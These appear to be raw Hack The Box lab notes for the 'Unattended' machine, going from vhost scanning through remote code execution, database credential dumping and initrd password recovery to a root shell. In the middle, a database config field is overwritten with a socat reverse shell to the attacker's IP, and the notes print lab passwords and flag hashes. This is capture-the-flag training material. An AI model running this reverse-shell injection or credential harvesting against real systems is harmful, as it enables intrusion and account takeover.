@@ -1,0 +1,471 @@
+Added 
+10.10.10.126    nestedflanders.htb www.nestedflanders.htb unattended.htb
+to /etc/hosts to get https page
+
+Root page / redirects to: https://www.nestedflanders.htb
+
+Webpage at https://www.nestedflanders.htb/index.php
+
+
+root@kali:~/HTB/Unattended# nmap --script /usr/share/nmap/scripts/http-vhosts.nse 10.10.10.126
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 12:51 WAT
+Nmap scan report for www.nestedflanders.htb (10.10.10.126)
+Host is up (0.26s latency).
+Not shown: 998 filtered ports
+PORT    STATE SERVICE
+80/tcp  open  http
+| http-vhosts: 
+| www.nestedflanders.htb : 301 -> https://www.nestedflanders.htb
+| apache.nestedflanders.htb
+| info.nestedflanders.htb
+| blog.nestedflanders.htb
+|_123 names had status 200
+443/tcp open  https
+| http-vhosts: 
+| 74 names had status 200
+| 48 names had status 400
+| ns0.nestedflanders.htb
+| ftp.nestedflanders.htb
+| administration.nestedflanders.htb
+| dmz.nestedflanders.htb
+|_mta.nestedflanders.htb
+
+Nmap done: 1 IP address (1 host up) scanned in 49.50 seconds
+root@kali:~/HTB/Unattended# 
+
+
+root@kali:~/HTB/Unattended# nmap --script /usr/share/nmap/scripts/http-vhosts.nse 10.10.10.126 -p 80,8080,443
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 12:54 WAT
+Nmap scan report for www.nestedflanders.htb (10.10.10.126)
+Host is up (0.33s latency).
+
+PORT     STATE    SERVICE
+80/tcp   open     http
+| http-vhosts: 
+| www.nestedflanders.htb : 301 -> https://www.nestedflanders.htb
+|_126 names had status 200
+443/tcp  open     https
+| http-vhosts: 
+| ads.nestedflanders.htb : 400
+| testing.nestedflanders.htb : 400
+| ns.nestedflanders.htb : 400
+| xml.nestedflanders.htb : 400
+| wiki.nestedflanders.htb : 400
+|_122 names had status 200
+8080/tcp filtered http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 32.08 seconds
+
+
+root@kali:~/HTB/Unattended# python rce.py "vh8lf7vikrdupdljv8k1e9gdh7"
+> uname -a
+....
+Linux unattended 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
+
+> whoami
+....
+www-data
+
+(pseudo terminal)$ env
+....
+APACHE_RUN_DIR=/var/run/apache2
+APACHE_PID_FILE=/var/run/apache2/apache2.pid
+JOURNAL_STREAM=8:13094
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+INVOCATION_ID=ada506b488ac4d6b9d3660a58e58a8dd
+APACHE_LOCK_DIR=/var/lock/apache2
+LANG=C
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+APACHE_LOG_DIR=/var/log/apache2
+PWD=/var/www/html
+
+(pseudo terminal)$ ps aux
+....
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+www-data   582 28.8  0.6 180972 14236 ?        S    10:09   9:49 nginx: worker process
+www-data  1299  0.0  0.0   4288   752 ?        S    10:43   0:00 sh -c ps aux
+www-data  1300  0.0  0.1  36636  2720 ?        R    10:43   0:00 ps aux
+
+(pseudo terminal)$ find / -perm -u=s -type f 2>/dev/null
+....
+/bin/ping
+/bin/su
+/bin/mount
+/bin/umount
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+
+
+Using SUID ping
+
+(pseudo terminal)$ /bin/ping 10.10.14.216
+...
+Outputs
+root@kali:~/HTB/Jarvis# tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
+19:01:04.924450 IP www.nestedflanders.htb > kali: ICMP echo request, id 4054, seq 1, length 64
+19:01:04.924529 IP kali > www.nestedflanders.htb: ICMP echo reply, id 4054, seq 1, length 64
+19:01:05.924061 IP www.nestedflanders.htb > kali: ICMP echo request, id 4054, seq 2, length 64
+
+www-data@unattended:/var/www/html$ cat index.php
+cat index.php
+<?php
+$servername = "localhost";
+$username = "nestedflanders";
+$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
+$db = "neddy";
+$conn = new mysqli($servername, $username, $password, $db);
+$debug = False;
+
+include "6fb17817efb4131ae4ae1acae0f7fd48.php";
+
+function getTplFromID($conn) {
+	global $debug;
+	$valid_ids = array (25,465,587);
+	if ( (array_key_exists('id', $_GET)) && (intval($_GET['id']) == $_GET['id']) && (in_array(intval($_GET['id']),$valid_ids)) ) {
+			$sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
+	} else {
+		$sql = "SELECT name FROM idname where id = '25'";
+	}
+	if ($debug) { echo "sqltpl: $sql<br>\n"; } 
+	
+	$result = $conn->query($sql);
+	if ($result->num_rows > 0) {
+	while($row = $result->fetch_assoc()) {
+		$ret = $row['name'];
+	}
+	} else {
+		$ret = 'main';
+	}
+	if ($debug) { echo "rettpl: $ret<br>\n"; }
+	return $ret;
+}
+
+function getPathFromTpl($conn,$tpl) {
+	global $debug;
+	$sql = "SELECT path from filepath where name = '".$tpl."'";
+	if ($debug) { echo "sqlpath: $sql<br>\n"; }
+	$result = $conn->query($sql);
+	if ($result->num_rows > 0) {
+		while($row = $result->fetch_assoc()) {
+			$ret = $row['path'];
+		}
+	}
+	if ($debug) { echo "retpath: $ret<br>\n"; }
+	return $ret;
+}
+
+$tpl = getTplFromID($conn);
+$inc = getPathFromTpl($conn,$tpl);
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Ne(ste)d Flanders</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="bootstrap.min.css">
+  <script src="jquery.min.js"></script>
+  <script src="bootstrap.min.js"></script>
+</head>
+<body>
+
+<div class="container">
+  <h1>Ne(ste)d Flanders' Portfolio</h1>
+</div>
+
+<div class="container">
+<div center class="row">
+<?php
+
+$sql = "SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id";
+if ($debug) { echo "sql: $sql<br>\n"; }
+
+$result = $conn->query($sql);
+if ($result->num_rows > 0) {
+	while($row = $result->fetch_assoc()) {
+		//if ($debug) { echo "rowid: ".$row['id']."<br>\n"; } // breaks layout
+		echo '<div class="col-md-2"><a href="index.php?id='.$row['id'].'" target="maifreim">'.$row['name'].'</a></div>';
+		}
+} else {
+?>
+	<div class="col-md-2"><a href="index.php?id=25">main</a></div>
+	<div class="col-md-2"><a href="index.php?id=465">about</a></div>
+	<div class="col-md-2"><a href="index.php?id=587">contact</a></div>
+	<?php
+}
+
+?>
+</div> <!-- row -->
+</div> <!-- container -->
+
+
+<div class="container">
+<div class="row">
+<!-- <div align="center"> -->
+<?php
+include("$inc");
+?>
+<!-- </div> -->
+
+</div> <!-- row -->
+</div> <!-- container -->
+<?php if ($debug) { echo "include $inc;<br>\n"; } ?>
+
+</body>
+</html>
+
+<?php
+$conn->close();
+?>
+www-data@unattended:/var/www/html$ 
+
+
+www-data@unattended:/tmp$  mysql -u nestedflanders -p
+ mysql -u nestedflanders -p
+Enter password: 1036913cf7d38d4ea4f79b050f171e9fbf3f5e
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 11901
+Server version: 10.1.37-MariaDB-0+deb9u1 Debian 9.6
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> 
+MariaDB [(none)]> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| neddy              |
++--------------------+
+2 rows in set (0.00 sec)
+
+MariaDB [(none)]> use neddy;
+use neddy;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [neddy]> 
+MariaDB [neddy]> show tables;
+show tables;
++-----------------+
+| Tables_in_neddy |
++-----------------+
+| config          |
+| customers       |
+| employees       |
+| filepath        |
+| idname          |
+| offices         |
+| orderdetails    |
+| orders          |
+| payments        |
+| productlines    |
+| products        |
++-----------------+
+11 rows in set (0.00 sec)
+
+MariaDB [neddy]> 
+MariaDB [neddy]> SELECT * FROM config;
+SELECT * FROM config;
++-----+-------------------------+--------------------------------------------------------------------------+
+| id  | option_name             | option_value                                                             |
++-----+-------------------------+--------------------------------------------------------------------------+
+|  54 | offline                 | 0                                                                        |
+|  55 | offline_message         | Site offline, please come back later                                     |
+|  56 | display_offline_message | 0                                                                        |
+|  57 | offline_image           |                                                                          |
+|  58 | sitename                | NestedFlanders                                                           |
+|  59 | editor                  | tinymce                                                                  |
+|  60 | captcha                 | 0                                                                        |
+|  61 | list_limit              | 20                                                                       |
+|  62 | access                  | 1                                                                        |
+|  63 | debug                   | 0                                                                        |
+|  64 | debug_lang              | 0                                                                        |
+|  65 | dbtype                  | mysqli                                                                   |
+|  66 | host                    | localhost                                                                |
+|  67 | live_site               |                                                                          |
+|  68 | gzip                    | 0                                                                        |
+|  69 | error_reporting         | default                                                                  |
+|  70 | ftp_host                | 127.0.0.1                                                                |
+|  71 | ftp_port                | 21                                                                       |
+|  72 | ftp_user                | flanders                                                                 |
+|  73 | ftp_pass                | 0e1aff658d8614fd0eac6705bb69fb684f6790299e4cf01e1b90b1a287a94ffcde451466 |
+|  74 | ftp_root                | /                                                                        |
+|  75 | ftp_enable              | 1                                                                        |
+|  76 | offset                  | UTC                                                                      |
+|  77 | mailonline              | 1                                                                        |
+|  78 | mailer                  | mail                                                                     |
+|  79 | mailfrom                | nested@nestedflanders.htb                                                |
+|  80 | fromname                | Neddy                                                                    |
+|  81 | sendmail                | /usr/sbin/sendmail                                                       |
+|  82 | smtpauth                | 0                                                                        |
+|  83 | smtpuser                |                                                                          |
+|  84 | smtppass                |                                                                          |
+|  85 | smtppass                |                                                                          |
+|  86 | checkrelease            | /home/guly/checkbase.pl;/home/guly/checkplugins.pl;                      |
+|  87 | smtphost                | localhost                                                                |
+|  88 | smtpsecure              | none                                                                     |
+|  89 | smtpport                | 25                                                                       |
+|  90 | caching                 | 0                                                                        |
+|  91 | cache_handler           | file                                                                     |
+|  92 | cachetime               | 15                                                                       |
+|  93 | MetaDesc                |                                                                          |
+|  94 | MetaKeys                |                                                                          |
+|  95 | MetaTitle               | 1                                                                        |
+|  96 | MetaAuthor              | 1                                                                        |
+|  97 | MetaVersion             | 0                                                                        |
+|  98 | robots                  |                                                                          |
+|  99 | sef                     | 1                                                                        |
+| 100 | sef_rewrite             | 0                                                                        |
+| 101 | sef_suffix              | 0                                                                        |
+| 102 | unicodeslugs            | 0                                                                        |
+| 103 | feed_limit              | 10                                                                       |
+| 104 | lifetime                | 1                                                                        |
+| 105 | session_handler         | file                                                                     |
++-----+-------------------------+--------------------------------------------------------------------------+
+52 rows in set (0.00 sec)
+
+MariaDB [neddy]> update config set option_value = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.13.134:80" where id = 86;
+
+
+root@kali:~/HTB/Unattended# socat file:`tty`,raw,echo=0 tcp-listen:80
+guly@unattended:~$ ls -a
+.   .bash_history  .bashrc       checkplugins.pl  .profile
+..  .bash_logout   checkbase.pl  nohup.out        user.txt
+guly@unattended:~$ cat user.txt
+9b413f37c8d2141e38ee2827170eef14
+guly@unattended:~$ pwd
+/home/guly
+guly@unattended:~$ env
+LS_COLORS=
+LANG=en_US.UTF-8
+SOCAT_PPID=4469
+PWD=/home/guly
+SOCAT_VERSION=1.7.3.1
+HOME=/home/guly
+SHELL=/bin/sh
+SOCAT_PID=4469
+SHLVL=1
+LOGNAME=guly
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
+_=/usr/bin/env
+
+
+
+guly@unattended:/home$ cd /boot
+guly@unattended:/boot$ ls -a
+.                     grub                      lost+found
+..                    guid                      System.map-4.9.0-8-amd64
+config-4.9.0-8-amd64  initrd.img-4.9.0-8-amd64  vmlinuz-4.9.0-8-amd64
+guly@unattended:/boot$ id
+uid=1000(guly) gid=1000(guly) groups=1000(guly),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),47(grub),108(netdev)
+guly@unattended:/boot$ groups
+guly cdrom floppy audio dip video plugdev grub netdev
+guly@unattended:/boot$ groups guly
+guly : guly cdrom floppy audio dip video plugdev grub netdev
+
+guly@unattended:/boot$ find / -perm -2000 -type f 2>/dev/null
+/usr/bin/ssh-agent
+/usr/bin/chage
+/usr/bin/wall
+/usr/bin/bsd-write
+/usr/bin/expiry
+/usr/bin/crontab
+/sbin/unix_chkpwd
+
+guly@unattended:/etc/initramfs-tools$ ls -a
+.  ..  conf.d  hooks  initramfs.conf  modules  scripts  update-initramfs.conf
+
+guly@unattended:/boot$ cd /tmp
+guly@unattended:/tmp$ ls -a
+.
+..
+.font-unix
+.ICE-unix
+systemd-private-804bda30a64c4dd1a2bd036b8188696a-apache2.service-P1Qn7X
+systemd-private-804bda30a64c4dd1a2bd036b8188696a-apache2.service-veH6H2
+systemd-private-804bda30a64c4dd1a2bd036b8188696a-systemd-timesyncd.service-aceNVO
+systemd-private-804bda30a64c4dd1a2bd036b8188696a-systemd-timesyncd.service-LRjCdQ
+.Test-unix
+.X11-unix
+.XIM-unix
+guly@unattended:/tmp$ touch -t 201812201740 start
+guly@unattended:/tmp$ touch -t 201812201751 stop
+<rep -v -e /proc -e /dev -e /sys -e /run | tee files
+/var/tmp/stop
+/var/lib/initramfs-tools/4.9.0-8-amd64
+/var/lib/dhcp/dhclient.ens33.leases
+/boot/guid
+/boot/initrd.img-4.9.0-8-amd64
+/usr/share/initramfs-tools/scripts/local-top/cryptroot
+/usr/share/initramfs-tools/hooks/unattended
+/tmp/stop
+guly@unattended:/tmp$ 
+
+guly@unattended:/boot$ ls -la
+total 26835
+drwxr-xr-x  4 root root     1024 Dec 20  2018 .
+drwxr-xr-x 22 root root     4096 Dec 21  2018 ..
+-rw-r--r--  1 root root   186563 Oct 27  2018 config-4.9.0-8-amd64
+drwxr-xr-x  5 root root     1024 Dec 20  2018 grub
+-rw-r--r--  1 root root       37 Dec 20  2018 guid
+-rw-r-----  1 root grub 19729540 Dec 20  2018 initrd.img-4.9.0-8-amd64
+drwx------  2 root root    12288 Dec 20  2018 lost+found
+-rw-r--r--  1 root root  3195896 Oct 27  2018 System.map-4.9.0-8-amd64
+-rw-r--r--  1 root root  4232992 Oct 27  2018 vmlinuz-4.9.0-8-amd64
+
+
+Send initrd.img-4.9.0-8-amd64 to own box for decompression
+
+
+
+root@kali:~/HTB/Unattended/www# zcat initrd.img-4.9.0-8-amd64 | cpio -idmv
+
+
+
+root@kali:~/HTB/Unattended# cat www/scripts/local-top/cryptroot
+................................
+		if [ ! -e "$NEWROOT" ]; then
+      # guly: we have to deal with lukfs password sync when root changes her one
+      if ! crypttarget="$crypttarget" cryptsource="$cryptsource" \
+        /sbin/uinitrd c0m3s3f0ss34nt4n1 | $cryptopen ; then
+				message "cryptsetup: cryptsetup failed, bad password or options?"
+				sleep 3
+				continue
+			fi
+		fi
+
+root@kali:~/HTB/Unattended# www/sbin/uinitrd c0m3s3f0ss34nt4n1
+supercazzola
+
+
+
+
+
+
+
+
+
+
+
+
+guly@unattended:~$ su 
+Password: 132f93ab100671dcb263acaf5dc95d8260e8b7c6
+root@unattended:~# cat root.txt
+559c0e00045bea4b7ce2d2f88e0791d3
+
